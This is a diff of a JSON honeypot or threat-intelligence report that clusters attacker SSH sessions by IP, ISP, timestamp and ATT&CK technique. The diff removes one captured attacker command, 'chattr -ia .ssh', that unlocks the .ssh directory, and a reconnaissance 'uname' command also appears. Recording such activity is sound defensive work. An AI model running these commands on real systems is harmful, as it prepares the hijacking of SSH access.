+          "session_id": "IR-307f0f7dffcc",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-07-05T13:20:14.647075Z"
+        },
+        {
+          "session_id": "IR-d29e92eb4c6f",
           "src_ip": "185.242.3.195",
           "country": "DE",
           "isp": "Felcloud",
           "command_count": 1,
-          "timestamp": "2026-07-05T09:19:45.264205Z"
+          "timestamp": "2026-07-05T13:20:18.072066Z"
         },
         {
-          "session_id": "IR-fda58eae4223",
+          "session_id": "IR-81710ca7c781",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-05T09:22:54.245894Z"
+          "timestamp": "2026-07-05T13:32:01.054903Z"
         },
         {
-          "session_id": "IR-ede363c8630a",
+          "session_id": "IR-8b0d12afc428",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-05T09:34:11.157253Z"
+          "timestamp": "2026-07-05T13:43:36.152569Z"
         },
         {
-          "session_id": "IR-7af2ca7bb7ff",
+          "session_id": "IR-2918a457d9d5",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-05T09:45:37.923453Z"
+          "timestamp": "2026-07-05T13:55:12.856007Z"
         },
         {
-          "session_id": "IR-2bff20a7de1b",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T09:56:54.558469Z"
-        },
-        {
-          "session_id": "IR-b3a8a496c24e",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T10:08:19.348033Z"
-        },
-        {
-          "session_id": "IR-3bb7c20d6509",
+          "session_id": "IR-817799407a02",
           "src_ip": "185.242.3.195",
           "country": "DE",
           "isp": "Felcloud",
           "command_count": 1,
-          "timestamp": "2026-07-05T10:15:25.847443Z"
+          "timestamp": "2026-07-05T13:57:11.468081Z"
         },
         {
-          "session_id": "IR-265673c0d2d3",
+          "session_id": "IR-d82050af8977",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-05T10:19:23.712037Z"
+          "timestamp": "2026-07-05T14:06:46.533526Z"
         },
         {
-          "session_id": "IR-7b681635e282",
+          "session_id": "IR-1678d1f703a1",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-05T10:30:39.785894Z"
+          "timestamp": "2026-07-05T14:18:34.385382Z"
         },
         {
-          "session_id": "IR-d756cb335a92",
+          "session_id": "IR-feaa0ded2319",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-05T10:41:52.631918Z"
+          "timestamp": "2026-07-05T14:30:11.232773Z"
         },
         {
-          "session_id": "IR-cbe717d83de6",
+          "session_id": "IR-a6cc1a61a83b",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:41:54.356650Z"
+        },
+        {
+          "session_id": "IR-2bb73ec4fb9c",
           "src_ip": "185.242.3.195",
           "country": "DE",
           "isp": "Felcloud",
           "command_count": 1,
-          "timestamp": "2026-07-05T10:52:05.869635Z"
+          "timestamp": "2026-07-05T14:52:57.823203Z"
         },
         {
-          "session_id": "IR-d1168a0f4c26",
+          "session_id": "IR-32e2850f659e",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-05T10:52:47.564280Z"
-        },
-        {
-          "session_id": "IR-3129612b7ffe",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T11:03:48.871115Z"
-        },
-        {
-          "session_id": "IR-b5fc303310d8",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T11:14:55.466546Z"
-        },
-        {
-          "session_id": "IR-419ab38a5ba9",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T11:25:53.918046Z"
-        },
-        {
-          "session_id": "IR-83928d260c03",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T11:37:18.048576Z"
-        },
-        {
-          "session_id": "IR-5d39dfe8dae3",
-          "src_ip": "185.242.3.195",
-          "country": "DE",
-          "isp": "Felcloud",
-          "command_count": 1,
-          "timestamp": "2026-07-05T11:47:29.271103Z"
-        },
-        {
-          "session_id": "IR-16ad202dc8b3",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T11:48:32.361013Z"
-        },
-        {
-          "session_id": "IR-34270eb01af5",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T11:59:56.010094Z"
-        },
-        {
-          "session_id": "IR-6b8137cdc4a0",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T12:10:56.963006Z"
-        },
-        {
-          "session_id": "IR-43fef282bd42",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T12:22:29.316161Z"
-        },
-        {
-          "session_id": "IR-3edc6e573015",
-          "src_ip": "185.242.3.195",
-          "country": "DE",
-          "isp": "Felcloud",
-          "command_count": 1,
-          "timestamp": "2026-07-05T12:24:36.279766Z"
-        },
-        {
-          "session_id": "IR-b8bf82339cf1",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T12:34:08.790010Z"
-        },
-        {
-          "session_id": "IR-4509afd3a42c",
-          "src_ip": "45.198.224.120",
-          "country": "NL",
-          "isp": "VPSVAULT.HOST LTD",
-          "command_count": 1,
-          "timestamp": "2026-07-05T12:45:44.698921Z"
+          "timestamp": "2026-07-05T14:54:08.742034Z"
         }
       ]
     },
@@ -1176,71 +441,9 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "223.223.199.221"
+        "115.190.125.207"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "c32b4937ce8564ea",
-      "ttps": [
-        {
-          "id": "T1021.004",
-          "name": "Remote Services: SSH"
-        }
-      ],
-      "representative_commands": [
-        "cd ~; chattr -ia .ssh; lockr -ia .ssh"
-      ],
-      "members": [
-        {
-          "session_id": "IR-215a463c4d89",
-          "src_ip": "223.223.199.221",
-          "country": "CN",
-          "isp": "BeiJing guangdianxinchuang communication &",
-          "command_count": 1,
-          "timestamp": "2026-07-05T11:15:37.146943Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-007",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "180.95.231.27"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "4ade1590247e2996",
-      "ttps": [],
-      "representative_commands": [
-        "Accept: */*"
-      ],
-      "members": [
-        {
-          "session_id": "IR-01e108bc435d",
-          "src_ip": "180.95.231.27",
-          "country": "CN",
-          "isp": "China Unicom Gansu province network",
-          "command_count": 1,
-          "timestamp": "2026-07-05T11:20:20.405963Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-008",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 2,
-      "unique_ips": [
-        "115.190.126.161",
-        "106.12.29.168"
-      ],
-      "unique_ip_count": 2,
       "sequence_hash": "6fa4c8ac58e7a1d9",
       "ttps": [
         {
@@ -1253,20 +456,525 @@
       ],
       "members": [
         {
-          "session_id": "IR-eb2c3e4645ec",
-          "src_ip": "115.190.126.161",
+          "session_id": "IR-88e44d13bada",
+          "src_ip": "115.190.125.207",
           "country": "CN",
           "isp": "Beijing Volcano Engine Technology Co., Ltd.",
           "command_count": 1,
-          "timestamp": "2026-07-05T12:39:09.084970Z"
+          "timestamp": "2026-07-05T13:18:03.879887Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-007",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 61,
+      "unique_ips": [
+        "187.191.2.213"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "7ab552f01de999cb",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -v -n -r -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-be0cb4300165",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:52.998865Z"
         },
         {
-          "session_id": "IR-b701c007d0d5",
-          "src_ip": "106.12.29.168",
-          "country": "CN",
-          "isp": "Beijing Baidu Netcom Science and Technology Co., Ltd.",
+          "session_id": "IR-e597aae0b869",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
           "command_count": 1,
-          "timestamp": "2026-07-05T12:47:31.755536Z"
+          "timestamp": "2026-07-05T14:51:53.002171Z"
+        },
+        {
+          "session_id": "IR-acf0e37c5a7f",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.010168Z"
+        },
+        {
+          "session_id": "IR-3118a7b0b329",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.015542Z"
+        },
+        {
+          "session_id": "IR-3b98caa567c2",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.017050Z"
+        },
+        {
+          "session_id": "IR-8bec725701db",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.021000Z"
+        },
+        {
+          "session_id": "IR-f3cc4e15c131",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.025568Z"
+        },
+        {
+          "session_id": "IR-3b9ecb3f3e92",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.028802Z"
+        },
+        {
+          "session_id": "IR-d656a41a4c46",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.049515Z"
+        },
+        {
+          "session_id": "IR-131300906b61",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.382692Z"
+        },
+        {
+          "session_id": "IR-8377f85a98ea",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.383510Z"
+        },
+        {
+          "session_id": "IR-bded54ba188b",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.385306Z"
+        },
+        {
+          "session_id": "IR-d444fefe4b1c",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.387001Z"
+        },
+        {
+          "session_id": "IR-d9a97ec3e249",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.387902Z"
+        },
+        {
+          "session_id": "IR-f6fbf8a81cdc",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.388808Z"
+        },
+        {
+          "session_id": "IR-08e669237a1f",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.389598Z"
+        },
+        {
+          "session_id": "IR-418dcc765712",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.390354Z"
+        },
+        {
+          "session_id": "IR-0c9bbc8ae513",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.391426Z"
+        },
+        {
+          "session_id": "IR-fd4cd42355a1",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.392977Z"
+        },
+        {
+          "session_id": "IR-b189243ae74b",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.395272Z"
+        },
+        {
+          "session_id": "IR-fed97bfff890",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.397057Z"
+        },
+        {
+          "session_id": "IR-118495838324",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.450268Z"
+        },
+        {
+          "session_id": "IR-b96e44936cf3",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.451147Z"
+        },
+        {
+          "session_id": "IR-e84d000b7664",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.451944Z"
+        },
+        {
+          "session_id": "IR-f898e5374d85",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.452720Z"
+        },
+        {
+          "session_id": "IR-b1e3262e1547",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.453467Z"
+        },
+        {
+          "session_id": "IR-875be253e900",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.454232Z"
+        },
+        {
+          "session_id": "IR-515b09b39800",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.455037Z"
+        },
+        {
+          "session_id": "IR-0a469b1acfb3",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.455824Z"
+        },
+        {
+          "session_id": "IR-9c314118394c",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.456603Z"
+        },
+        {
+          "session_id": "IR-faa2435626a9",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.457362Z"
+        },
+        {
+          "session_id": "IR-76af10f1cfb8",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.458276Z"
+        },
+        {
+          "session_id": "IR-39e405a39665",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.459067Z"
+        },
+        {
+          "session_id": "IR-1fd7c94f55e3",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.480835Z"
+        },
+        {
+          "session_id": "IR-cf0b3bb797f9",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.481638Z"
+        },
+        {
+          "session_id": "IR-2e70d3453e84",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.483191Z"
+        },
+        {
+          "session_id": "IR-95d1d212b814",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.484788Z"
+        },
+        {
+          "session_id": "IR-594afb6c4820",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.487247Z"
+        },
+        {
+          "session_id": "IR-8c24193eea9c",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.488018Z"
+        },
+        {
+          "session_id": "IR-bef5134ef3b8",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.489571Z"
+        },
+        {
+          "session_id": "IR-efeae0e3f77e",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.490357Z"
+        },
+        {
+          "session_id": "IR-55bac573d0eb",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.491117Z"
+        },
+        {
+          "session_id": "IR-2f200e2b27c9",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.491888Z"
+        },
+        {
+          "session_id": "IR-f4ce09c30d8d",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.492665Z"
+        },
+        {
+          "session_id": "IR-b177b25c1de1",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.493414Z"
+        },
+        {
+          "session_id": "IR-4f1cf878bfa5",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.494170Z"
+        },
+        {
+          "session_id": "IR-932e0d9acfb9",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.576144Z"
+        },
+        {
+          "session_id": "IR-58886cb6a851",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.577950Z"
+        },
+        {
+          "session_id": "IR-a8d2483f8b01",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.578730Z"
+        },
+        {
+          "session_id": "IR-a1ecdc131b1a",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.580234Z"
+        },
+        {
+          "session_id": "IR-0c79e05c9a51",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.581042Z"
+        },
+        {
+          "session_id": "IR-44e9cfc5346c",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.582053Z"
+        },
+        {
+          "session_id": "IR-a847627ed9fb",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.582954Z"
+        },
+        {
+          "session_id": "IR-ff71d14c7dc5",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.584626Z"
+        },
+        {
+          "session_id": "IR-3f8631d579f3",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.585382Z"
+        },
+        {
+          "session_id": "IR-b67835c8e8b1",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.586140Z"
+        },
+        {
+          "session_id": "IR-09155733312d",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.587692Z"
+        },
+        {
+          "session_id": "IR-8fcd7ba8b643",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.589193Z"
+        },
+        {
+          "session_id": "IR-2bad36430622",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.589971Z"
+        },
+        {
+          "session_id": "IR-6c0253a7159d",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.590739Z"
+        },
+        {
+          "session_id": "IR-81dcc9d9a710",
+          "src_ip": "187.191.2.213",
+          "country": "MX",
+          "isp": "TOTAL PLAY TELECOMUNICACIONES SA DE CV",
+          "command_count": 1,
+          "timestamp": "2026-07-05T14:51:53.695168Z"
         }
       ]
     }
